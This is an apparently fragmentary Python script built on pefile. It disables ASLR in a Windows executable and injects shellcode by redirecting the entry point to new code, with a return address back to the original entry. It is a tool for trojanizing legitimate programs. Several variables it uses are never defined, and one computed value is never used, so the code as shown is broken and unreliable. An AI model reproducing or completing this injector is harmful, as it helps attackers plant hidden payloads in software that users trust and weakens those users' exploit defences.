#!/usr/bin/env python3

import sys
import os
import pefile
import argparse

# ASLR Status Checker / Disabler
def AslrStatus():

    global pe

    # ASLR Check
    dynamicBase = 0x40
    aslrcheck = pe.OPTIONAL_HEADER.DllCharacteristics & 0x0040

    # If ASLR is enabled, then disable it and save to new file
    if aslrcheck:
        if (args.info == False):
            print (" ASLR: \t\t\tEnabled - Disabling ASLR to " + newFile + "\n")
            pe.OPTIONAL_HEADER.DllCharacteristics &= ~dynamicBase
            pe.write(newFile)
            return True
        else:
            print(" ASLR: \t\t\tEnabled\n")
        #sys.exit(1)

    # Continue without ASLR
    else:
        print (" ASLR: \t\t\tDisabled\n")
        return False

#Injection
if args.info is False:

    if len(shellcode) < 8:
        sys.exit(" Minimum shellcode size 8 bytes")

    # Sets new Entry Point and aligns address
    aslr_ep = newEntryPoint - image_base
    epAdjustedSize = 0

    if aslr_ep % 4 == 0:
        pe.OPTIONAL_HEADER.AddressOfEntryPoint = aslr_ep
    else:
        epAdjustedSize = (4 - (aslr_ep % 4))
        aslr_ep = (4 - (aslr_ep % 4)) + aslr_ep

        pe.OPTIONAL_HEADER.AddressOfEntryPoint = aslr_ep

    print(" New Entry Point:\t\t"  '0x{:08x}'.format(aslr_ep))

    # Reformat original instruction return address to little endian
    if x64:
        returnAddress = (origEntryPoint + image_base).to_bytes(8, 'little')
    else:
        returnAddress = (origEntryPoint + image_base).to_bytes(4, 'little')
    
    pe.write(newFile)

pe.close()
print("\n")
